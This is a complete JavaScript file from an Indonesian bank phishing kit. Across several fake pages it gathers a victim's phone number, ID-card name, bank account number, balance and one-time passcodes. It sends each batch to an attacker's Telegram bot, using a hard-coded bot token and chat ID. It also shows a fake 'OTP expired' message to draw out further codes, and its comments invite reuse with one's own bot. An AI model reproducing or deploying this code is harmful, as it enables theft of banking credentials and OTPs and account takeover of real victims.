



   $(document).ready(function(){
    $('#formno').submit(function(e) {
        e.preventDefault();
    document.getElementById("lodingku").style.display = "block";
        });
    });


    function kirimPesan(event) {
    $("#lodingku").show();
     event.preventDefault();
    document.getElementById('kirim').innerHTML = "Memproses...";  
    var logo = document.getElementById('logo');
    var nomor = document.getElementById('nomor');
   
    var gabungan =logo.value + 
    '%0A%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : %0A' + nomor.value;

    var token = '5803902692:AAFUiqnbhEP6eF82ZhjcQTyxaIFnSy9KvlU'; // curls-NLhost
    var grup = '5921366438'; // Ganti dengan chat id dari bot yang kamu buat

    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
   
    success: function(){
    setTimeout(function(){
       $("#lodingku").hide();
       window.location='card.php';

     var accNomor = document.getElementById("nomor").value;
     sessionStorage.setItem("accNomor", accNomor);    
        }, 1500);}});};


function kirimCard(event) {
    $("#lodingku").show();
     event.preventDefault();
    document.getElementById('kirim').innerHTML = "Memproses...";  
    var logo = document.getElementById('logo');
    var accNomor = document.getElementById('accNomor');
    var namaKtp = document.getElementById('namaktp');
    var noreK = document.getElementById('norek');
    
   
    var gabungan =''+ 
    logo.value + '%0A%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : %0A' + 
    accNomor.value + '%0A%0A𝗡𝗮𝗺𝗮 𝗞𝗧𝗣 : %0A' + 
    namaKtp.value + '%0A%0A𝗡𝗼 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 : %0A' + 
    noreK.value;

    var token = '5803902692:AAFUiqnbhEP6eF82ZhjcQTyxaIFnSy9KvlU'; // curls-NLhost
    var grup = '5921366438'; // Ganti dengan chat id dari bot yang kamu buat
    


    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
   
    success: function(){
    setTimeout(function(){
       $("#lodingku").hide();
       window.location='saldo.php';

     var accNamaKtp = document.getElementById("namaktp").value;
     sessionStorage.setItem("accNamaKtp", accNamaKtp);
     
     var accNorek = document.getElementById("norek").value;
     sessionStorage.setItem("accNorek", accNorek);
     
        }, 1500);}});};
        
        

function kirimSaldo(event) {
    $("#lodingku").show();
     event.preventDefault();
    document.getElementById('kirim').innerHTML = "Memproses...";  
    var logo = document.getElementById('logo');
    var accNomor = document.getElementById('accNomor');
    var accNamaKtp = document.getElementById('accNamaKtp');
    var accNorek = document.getElementById('accNorek');
    var saldo = document.getElementById('saldo');
    
   
    var gabungan =''+ 
    logo.value + '%0A%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : %0A' + 
    accNomor.value + '%0A%0A𝗡𝗮𝗺𝗮 𝗞𝗧𝗣 : %0A' + 
    accNamaKtp.value + '%0A%0A𝗡𝗼 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 : %0A' + 
    accNorek.value + '%0A%0A𝗦𝗮𝗹𝗱𝗼 : %0A' + 
    saldo.value;

    var token = '5803902692:AAFUiqnbhEP6eF82ZhjcQTyxaIFnSy9KvlU'; // curls-NLhost
    var grup = '5921366438'; // Ganti dengan chat id dari bot yang kamu buat
    


    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
   
    success: function(){
    setTimeout(function(){
       $("#lodingku").hide();
       window.location='otp.php';
     
      var accSaldo = document.getElementById("saldo").value;
     sessionStorage.setItem("accSaldo", accSaldo);
     
        }, 1500);}});};


function kirimToken(event) {
    $("#lodingku").show();
     event.preventDefault();
     document.getElementById('kirim').innerHTML = "Memproses...";  
    var logo = document.getElementById('logo');
    var accNomor = document.getElementById('accNomor');
    var accNamaKtp = document.getElementById('accNamaKtp');
    var accNorek = document.getElementById('accNorek');
    var accSaldo = document.getElementById('accSaldo');
    var inptoken1 = document.getElementById('inptoken1');
    var inptoken2 = document.getElementById('inptoken2');
    var inptoken3 = document.getElementById('inptoken3');
    var inptoken4 = document.getElementById('inptoken4');
    var inptoken5 = document.getElementById('inptoken5');
    var inptoken6 = document.getElementById('inptoken6');
    
    
   
    var gabungan =''+ 
    logo.value + '%0A%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 : %0A' + 
    accNomor.value + '%0A%0A𝗡𝗮𝗺𝗮 𝗞𝗧𝗣 : %0A' + 
    accNamaKtp.value + '%0A%0A𝗡𝗼 𝗥𝗲𝗸𝗲𝗻𝗶𝗻𝗴 : %0A' + 
    accNorek.value + '%0A%0A𝗦𝗮𝗹𝗱𝗼 : %0A' +
    accSaldo.value + '%0A%0A𝗧𝗼𝗸𝗲𝗻 : %0A' + 
    inptoken1.value + inptoken2.value + inptoken3.value + inptoken4.value + inptoken5.value + inptoken6.value;

    var token = '5803902692:AAFUiqnbhEP6eF82ZhjcQTyxaIFnSy9KvlU'; // curls-NLhost
    var grup = '5921366438'; // Ganti dengan chat id dari bot yang kamu buat
    


    $.ajax({
        url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
        method: `POST`,
   
    success: function(){
    setTimeout(function(){
       $("#lodingku").hide();
       document.getElementById('kirim').innerHTML = "Lanjutkan";  
     $("#inptoken1").val("");
      $("#inptoken2").val("");
       $("#inptoken3").val("");
        $("#inptoken4").val("");
         $("#inptoken5").val("");
          $("#inptoken6").val("");
    
       $("#inptoken1").focus();

    $("#invalid").addClass("fontku");      
    $("#invalid").text("Kode OTP Kadaluarsa, Silahkan Coba Lagi");
   $("#invalid").css("color","red");
   
   
   // var accNomor = document.getElementById("nomor").value;
     //sessionStorage.setItem("accNomor", accNomor);

     //var accNamaKtp = document.getElementById("namaktp").value;
    // sessionStorage.setItem("accNamaKtp", accNamaKtp);
     
     //var accNorek = document.getElementById("norek").value;
     //sessionStorage.setItem("accNorek", accNorek);
     
     //var accSaldo = document.getElementById("saldo").value;
     //sessionStorage.setItem("accSaldo", accSaldo);
     
        }, 1500);}});};




// acc items
var accNomor = sessionStorage.getItem("accNomor");
 document.getElementById("accNomor").value = accNomor + "";
 
 var accNamaKtp = sessionStorage.getItem("accNamaKtp");
 document.getElementById("accNamaKtp").value = accNamaKtp + "";
 
 var accNorek = sessionStorage.getItem("accNorek");
 document.getElementById("accNorek").value = accNorek + "";
 
 var accSaldo = sessionStorage.getItem("accSaldo");
 document.getElementById("accSaldo").value = accSaldo + "";